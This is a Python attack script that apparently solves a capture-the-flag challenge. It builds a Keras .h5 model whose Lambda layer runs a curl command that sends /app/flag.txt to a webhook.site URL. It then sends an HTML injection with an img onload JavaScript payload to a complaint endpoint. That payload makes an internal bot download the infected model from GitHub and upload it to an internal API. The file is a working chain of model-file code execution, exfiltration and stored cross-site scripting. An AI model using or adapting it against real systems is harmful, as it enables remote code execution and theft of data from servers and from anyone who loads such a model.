import requests
# import tensorflow as tf
# from tensorflow import keras
# from keras.models import Sequential
# from keras.layers import Dense, Dropout, Activation, Lambda

webhook = 'https://webhook.site/d75a72bb-ce00-4354-a9f6-1bf4464f1be5'
amogus_img = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR4eyBSOvftm-k0XUQSDfhJLp5tXD2JptsLXspF-fLWzg&s"
url = 'http://94.237.63.93:43369'
h5_url = 'https://raw.githubusercontent.com/Wgmlgz/cyberpsychosis/master/infected3.h5'
model_path = "infected.h5"

def exploit(x):
    import os
    os.system(f"curl --data-binary '@/app/flag.txt' https://webhook.site/d75a72bb-ce00-4354-a9f6-1bf4464f1be5")
    return x
    
def build_model():
    model = Sequential()
    model.add(Dense(10, input_shape=(784,)))
    model.add(Activation("relu"))                            
    model.add(Dropout(0.2))
    model.add(Lambda(exploit))
    model.add(Dense(10))
    model.add(Activation("softmax"))

    model.compile(loss="categorical_crossentropy", metrics=["accuracy"], optimizer="adam")

    model.save(model_path)
    
def train_model():


  lambdaLayer = tf.keras.layers.Lambda(exploit, name="output")

  original = tf.keras.applications.vgg16.VGG16()
  original.summary()

  inp = original.input
  original.layers.pop()

  infected = tf.keras.models.Model(inp, lambdaLayer(original.layers[-1].output))

  for layer in infected.layers:
      layer.trainable = False
      
  infected.summary()
  infected.save(model_path)

def sus():
  js_payload = f'''(async () => {{
    const file = new File([(await (await (await fetch('{h5_url}')).blob()))], 'model.h5')
    const data = new FormData()
    data.append('file', file)
    fetch('http://127.0.0.1:1337/api/internal/model', {{ method: 'POST', body: data, headers: {{ 'X-SPACE-NO-CSRF': '1' }} }})
  }})()'''
  print(js_payload)
  html_injection =  f'''<img src="{amogus_img}" onload="{js_payload}" />'''
  print(html_injection)
  requests.post(url + '/api/complaint', headers={'X-SPACE-NO-CSRF': '1'}, json={
    "description":"amogus",
    "image_data":amogus_img,
    "prediction": html_injection
  })
  
# build_model()
sus()